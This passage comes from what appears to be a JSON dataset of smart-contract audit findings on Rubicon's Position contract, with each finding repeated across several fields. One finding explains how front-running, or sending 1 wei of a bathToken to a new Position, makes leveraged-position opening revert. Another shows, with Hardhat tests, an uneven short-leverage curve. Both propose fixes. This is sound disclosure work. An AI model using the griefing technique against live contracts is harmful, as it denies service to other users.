0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n            // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\n\nNext, look at the code of `_maxBorrow`:\n\n```solidity\nfunction _maxBorrow(\n        address _bathToken\n    ) internal view returns (uint256 _max) {\n        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n            .getAccountLiquidity(address(this));\t\t//if address(this) is new user of comptroller, _liq always equal to 0\n\n        require(_err == 0, \"_maxBorrow: ERROR\");\n        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\t//if _liq equals to 0, tx will revert.\n        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n\n        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n        _max = (_liq.mul(10 ** 18)).div(_price);\n        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n    }\n```\n\nTo make the _liq returned by `comptroller.getAccountLiquidity(address(this))` be 0, then address(this) must not provide any collateral. In other words, **this contract is a new user to the comptroller**. Obviously, the Position contract created by the user meets this condition.\n\nThe condition for calling `_maxBorrow` is that `IERC20(_bathToken).balanceOf(address(this))` returns a non-zero value. **A newly created Position contract does not have any tokens. However, we can transfer 1wei _bathToken to it**. This allows the code to execute to _maxBorrow and revert.\n\n**There are two ways to transfer _bathToken to the newly created Position**:\n\n1.  front-run `buyAllAmountWithLeverage` or `sellAllAmountWithLeverage`.\n2.  Once the Position is created, transfer all _bathTokens supported by BathHouseV2 to it. The amount transferred is 1wei.\n\nIn fact, `_maxBorrow` will also revert in normal scenario. Position borrows other tokens resulting in _liq being 0.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nWe should use `comptroller.getAccountLiquidity` instead of the balance of _bathToken as the condition for calling `_maxBorrow`.\n\n```diff\n--- a/contracts/utilities/poolsUtility/Position.sol\n+++ b/contracts/utilities/poolsUtility/Position.sol\n@@ -534,7 +534,7 @@ contract Position is Ownable, DSMath {\n         uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n         // check if collateral was already supplied\n-        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n+        (,uint256 _minted,) = comptroller.getAccountLiquidity(address(this));\n        // how much is borrowed on a current loop\n         uint256 _loopBorrowed;\n```\n",
      "description": null,
      "impact": "## Impact\n\nBoth `buyAllAmountWithLeverage` and `sellAllAmountWithLeverage` always revert. **So all users cannot open a leveraged position**.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nWe should use `comptroller.getAccountLiquidity` instead of the balance of _bathToken as the condition for calling `_maxBorrow`.\n\n```diff\n--- a/contracts/utilities/poolsUtility/Position.sol\n+++ b/contracts/utilities/poolsUtility/Position.sol\n@@ -534,7 +534,7 @@ contract Position is Ownable, DSMath {\n         uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n         // check if collateral was already supplied\n-        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n+        (,uint256 _minted,) = comptroller.getAccountLiquidity(address(this));\n        // how much is borrowed on a current loop\n         uint256 _loopBorrowed;\n```\n",
      "poc": "## Proof of Concept\n\n`openPosition` is the entry point for users to open long/short positions, internally calling the `_borrowLimit` function to calculate an amount of iterations needed to reach desired amount with leverage. The logic of this function is: if the collateral has been provided, then the `_maxBorrow` function will be called to calculate the maximum amount available to borrow from `_bathToken` market, and then the returned result will be added to the _loopBorrowed variable.\n\n```solidity\n// check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n    // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n        // if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n            // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\n\nNext, look at the code of `_maxBorrow`:\n\n```solidity\nfunction _maxBorrow(\n        address _bathToken\n    ) internal view returns (uint256 _max) {\n        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n            .getAccountLiquidity(address(this));\t\t//if address(this) is new user of comptroller, _liq always equal to 0\n\n        require(_err == 0, \"_maxBorrow: ERROR\");\n        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\t//if _liq equals to 0, tx will revert.\n        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n\n        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n        _max = (_liq.mul(10 ** 18)).div(_price);\n        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n    }\n```\n\nTo make the _liq returned by `comptroller.getAccountLiquidity(address(this))` be 0, then address(this) must not provide any collateral. In other words, **this contract is a new user to the comptroller**. Obviously, the Position contract created by the user meets this condition.\n\nThe condition for calling `_maxBorrow` is that `IERC20(_bathToken).balanceOf(address(this))` returns a non-zero value. **A newly created Position contract does not have any tokens. However, we can transfer 1wei _bathToken to it**. This allows the code to execute to _maxBorrow and revert.\n\n**There are two ways to transfer _bathToken to the newly created Position**:\n\n1.  front-run `buyAllAmountWithLeverage` or `sellAllAmountWithLeverage`.\n2.  Once the Position is created, transfer all _bathTokens supported by BathHouseV2 to it. The amount transferred is 1wei.\n\nIn fact, `_maxBorrow` will also revert in normal scenario. Position borrows other tokens resulting in _liq being 0.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L545\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual Review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nBoth `buyAllAmountWithLeverage` and `sellAllAmountWithLeverage` always revert. **So all users cannot open a leveraged position**.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nWe should use `comptroller.getAccountLiquidity` instead of the balance of _bathToken as the condition for calling `_maxBorrow`.\n\n```diff\n--- a/contracts/utilities/poolsUtility/Position.sol\n+++ b/contracts/utilities/poolsUtility/Position.sol\n@@ -534,7 +534,7 @@ contract Position is Ownable, DSMath {\n         uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n         // check if collateral was already supplied\n-        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n+        (,uint256 _minted,) = comptroller.getAccountLiquidity(address(this));\n        // how much is borrowed on a current loop\n         uint256 _loopBorrowed;\n```\n",
        "poc": "## Proof of Concept\n\n`openPosition` is the entry point for users to open long/short positions, internally calling the `_borrowLimit` function to calculate an amount of iterations needed to reach desired amount with leverage. The logic of this function is: if the collateral has been provided, then the `_maxBorrow` function will be called to calculate the maximum amount available to borrow from `_bathToken` market, and then the returned result will be added to the _loopBorrowed variable.\n\n```solidity\n// check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n    // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n        // if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n            // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\n\nNext, look at the code of `_maxBorrow`:\n\n```solidity\nfunction _maxBorrow(\n        address _bathToken\n    ) internal view returns (uint256 _max) {\n        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n            .getAccountLiquidity(address(this));\t\t//if address(this) is new user of comptroller, _liq always equal to 0\n\n        require(_err == 0, \"_maxBorrow: ERROR\");\n        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\t//if _liq equals to 0, tx will revert.\n        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n\n        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n        _max = (_liq.mul(10 ** 18)).div(_price);\n        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n    }\n```\n\nTo make the _liq returned by `comptroller.getAccountLiquidity(address(this))` be 0, then address(this) must not provide any collateral. In other words, **this contract is a new user to the comptroller**. Obviously, the Position contract created by the user meets this condition.\n\nThe condition for calling `_maxBorrow` is that `IERC20(_bathToken).balanceOf(address(this))` returns a non-zero value. **A newly created Position contract does not have any tokens. However, we can transfer 1wei _bathToken to it**. This allows the code to execute to _maxBorrow and revert.\n\n**There are two ways to transfer _bathToken to the newly created Position**:\n\n1.  front-run `buyAllAmountWithLeverage` or `sellAllAmountWithLeverage`.\n2.  Once the Position is created, transfer all _bathTokens supported by BathHouseV2 to it. The amount transferred is 1wei.\n\nIn fact, `_maxBorrow` will also revert in normal scenario. Position borrows other tokens resulting in _liq being 0.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L545\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual Review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L545\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n\n\n# Vulnerability details\n\n## Impact\n\nBoth `buyAllAmountWithLeverage` and `sellAllAmountWithLeverage` always revert. **So all users cannot open a leveraged position**.\n\n## Proof of Concept\n\n`openPosition` is the entry point for users to open long/short positions, internally calling the `_borrowLimit` function to calculate an amount of iterations needed to reach desired amount with leverage. The logic of this function is: if the collateral has been provided, then the `_maxBorrow` function will be called to calculate the maximum amount available to borrow from `_bathToken` market, and then the returned result will be added to the _loopBorrowed variable.\n\n```solidity\n// check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n    // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n        // if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n            // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\n\nNext, look at the code of `_maxBorrow`:\n\n```solidity\nfunction _maxBorrow(\n        address _bathToken\n    ) internal view returns (uint256 _max) {\n        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n            .getAccountLiquidity(address(this));\t\t//if address(this) is new user of comptroller, _liq always equal to 0\n\n        require(_err == 0, \"_maxBorrow: ERROR\");\n        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\t//if _liq equals to 0, tx will revert.\n        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n\n        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n        _max = (_liq.mul(10 ** 18)).div(_price);\n        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n    }\n```\n\nTo make the _liq returned by `comptroller.getAccountLiquidity(address(this))` be 0, then address(this) must not provide any collateral. In other words, **this contract is a new user to the comptroller**. Obviously, the Position contract created by the user meets this condition.\n\nThe condition for calling `_maxBorrow` is that `IERC20(_bathToken).balanceOf(address(this))` returns a non-zero value. **A newly created Position contract does not have any tokens. However, we can transfer 1wei _bathToken to it**. This allows the code to execute to _maxBorrow and revert.\n\n**There are two ways to transfer _bathToken to the newly created Position**:\n\n1.  front-run `buyAllAmountWithLeverage` or `sellAllAmountWithLeverage`.\n2.  Once the Position is created, transfer all _bathTokens supported by BathHouseV2 to it. The amount transferred is 1wei.\n\nIn fact, `_maxBorrow` will also revert in normal scenario. Position borrows other tokens resulting in _liq being 0.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nWe should use `comptroller.getAccountLiquidity` instead of the balance of _bathToken as the condition for calling `_maxBorrow`.\n\n```diff\n--- a/contracts/utilities/poolsUtility/Position.sol\n+++ b/contracts/utilities/poolsUtility/Position.sol\n@@ -534,7 +534,7 @@ contract Position is Ownable, DSMath {\n         uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n         // check if collateral was already supplied\n-        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n+        (,uint256 _minted,) = comptroller.getAccountLiquidity(address(this));\n        // how much is borrowed on a current loop\n         uint256 _loopBorrowed;\n```\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 396,
      "page_start": null,
      "heading": "396. The curve of short leverage position is not smooth and may cause users to open positions that are different from expectations",
      "heading_cleaned": "The curve of short leverage position is not smooth and may cause users to open positions that are different from expectations",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n\n\n# Vulnerability details\n\n## Impact\nThe current implementation allows users to open short leverage of 1x.\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nWhen the user calls sellAllAmountWithLeverage with leverage == 1.0x , one 100% collateralization and borrowing is performed.\n\nConsider the USDC collateralization factor of 0.7, the user uses 1000 USDC to short WBTC, leverage == 1.0x, the contract will collateralize 1000 USDC to borrow 700 USD WBTC, then sell WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWhen leverage == 1.3x, the contract borrows 300 USD worth of WBTC and then sells the WBTC for 300 USDC, leaving the user with a position of 1300 USDC.\nAnd when leverage == 1.7x, the contract borrows 700 USD worth of WBTC and then sells the WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWe note that when the leverage is 1.0x and 1.7x, the user's position is the same, and the 1.3x position is smaller than the 1.0x position. This unsmoothed curve of short leverage position may cause the user to open a different position than expected.\n## Proof of Concept\nThe following POC shows that when the leverage is 1.0x and 1.7x, the user's position is the same\n```js\n      it(\"TESTME\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n      it(\"TESTME2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1_7\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Short positions ðŸ“‰\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME2\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n## Tools Used\nNone\n## Recommended Mitigation Steps\nConsider no longer supporting 1.0x short leverage\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n\n\n# Vulnerability details\n\n## Impact\nThe current implementation allows users to open short leverage of 1x. \n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nWhen the user calls sellAllAmountWithLeverage with leverage == 1.0x , one 100% collateralization and borrowing is performed.\n\nConsider the USDC collateralization factor of 0.7, the user uses 1000 USDC to short WBTC, leverage == 1.0x, the contract will collateralize 1000 USDC to borrow 700 USD WBTC, then sell WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWhen leverage == 1.3x, the contract borrows 300 USD worth of WBTC and then sells the WBTC for 300 USDC, leaving the user with a position of 1300 USDC.\nAnd when leverage == 1.7x, the contract borrows 700 USD worth of WBTC and then sells the WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWe note that when the leverage is 1.0x and 1.7x, the user's position is the same, and the 1.3x position is smaller than the 1.0x position. This unsmoothed curve of short leverage position may cause the user to open a different position than expected.\n## Proof of Concept\nThe following POC shows that when the leverage is 1.0x and 1.7x, the user's position is the same\n```js\n      it(\"TESTME\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n      it(\"TESTME2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1_7\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Short positions ðŸ“‰\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME2\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n## Tools Used\nNone\n## Recommended Mitigation Steps\nConsider no longer supporting 1.0x short leverage",
      "description": null,
      "impact": "## Impact\nThe current implementation allows users to open short leverage of 1x.\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nWhen the user calls sellAllAmountWithLeverage with leverage == 1.0x , one 100% collateralization and borrowing is performed.\n\nConsider the USDC collateralization factor of 0.7, the user uses 1000 USDC to short WBTC, leverage == 1.0x, the contract will collateralize 1000 USDC to borrow 700 USD WBTC, then sell WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWhen leverage == 1.3x, the contract borrows 300 USD worth of WBTC and then sells the WBTC for 300 USDC, leaving the user with a position of 1300 USDC.\nAnd when leverage == 1.7x, the contract borrows 700 USD worth of WBTC and then sells the WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWe note that when the leverage is 1.0x and 1.7x, the user's position is the same, and the 1.3x position is smaller than the 1.0x position. This unsmoothed curve of short leverage position may cause the user to open a different position than expected.\n",
      "mitigation": "## Recommended Mitigation Steps\nConsider no longer supporting 1.0x short leverage\n",
      "poc": "## Proof of Concept\nThe following POC shows that when the leverage is 1.0x and 1.7x, the user's position is the same\n```js\n      it(\"TESTME\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n      it(\"TESTME2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1_7\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Short positions ðŸ“‰\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME2\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nNone\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nThe current implementation allows users to open short leverage of 1x.\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nWhen the user calls sellAllAmountWithLeverage with leverage == 1.0x , one 100% collateralization and borrowing is performed.\n\nConsider the USDC collateralization factor of 0.7, the user uses 1000 USDC to short WBTC, leverage == 1.0x, the contract will collateralize 1000 USDC to borrow 700 USD WBTC, then sell WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWhen leverage == 1.3x, the contract borrows 300 USD worth of WBTC and then sells the WBTC for 300 USDC, leaving the user with a position of 1300 USDC.\nAnd when leverage == 1.7x, the contract borrows 700 USD worth of WBTC and then sells the WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWe note that when the leverage is 1.0x and 1.7x, the user's position is the same, and the 1.3x position is smaller than the 1.0x position. This unsmoothed curve of short leverage position may cause the user to open a different position than expected.\n",
        "recommendation": "## Recommended Mitigation Steps\nConsider no longer supporting 1.0x short leverage\n",
        "poc": "## Proof of Concept\nThe following POC shows that when the leverage is 1.0x and 1.7x, the user's position is the same\n```js\n      it(\"TESTME\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n      it(\"TESTME2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1_7\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Short positions ðŸ“‰\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME2\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nNone\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n\n\n# Vulnerability details\n\n## Impact\nThe current implementation allows users to open short leverage of 1x.\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nWhen the user calls sellAllAmountWithLeverage with leverage == 1.0x , one 100% collateralization and borrowing is performed.\n\nConsider the USDC collateralization factor of 0.7, the user uses 1000 USDC to short WBTC, leverage == 1.0x, the contract will collateralize 1000 USDC to borrow 700 USD WBTC, then sell WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWhen leverage == 1.3x, the contract borrows 300 USD worth of WBTC and then sells the WBTC for 300 USDC, leaving the user with a position of 1300 USDC.\nAnd when leverage == 1.7x, the contract borrows 700 USD worth of WBTC and then sells the WBTC for 700 USDC, leaving the user with a position of 1700 USDC.\nWe note that when the leverage is 1.0x and 1.7x, the user's position is the same, and the 1.3x position is smaller than the 1.0x position. This unsmoothed curve of short leverage position may cause the user to open a different position than expected.\n## Proof of Concept\nThe following POC shows that when the leverage is 1.0x and 1.7x, the user's position is the same\n```js\n      it(\"TESTME\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n      it(\"TESTME2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).sellAllAmountWithLeverage(\n          testStableCoin.address,\n          testCoin.address,\n          TUSDC_AMOUNT,\n          x1_7\n        );\n\n        // fetch position with id 1\n        const position = await Position.positions(1);\n        expect(await Position.owner()).to.equal(owner.address);\n        // position.asset == testStablecoin\n        expect(position[0]).to.equal(testStableCoin.address);\n        // position.quote == testCoin\n        expect(position[1]).to.equal(testCoin.address);\n        console.log(\"borrowedAmount : %s\",position[2]);\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Short positions ðŸ“‰\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME\nborrowedAmount : 19444444444444444444\n        âœ“ TESTME2\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L107-L118\n## Tools Used\nNone\n## Recommended Mitigation Steps\nConsider no longer supporting 1.0x short leverage\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
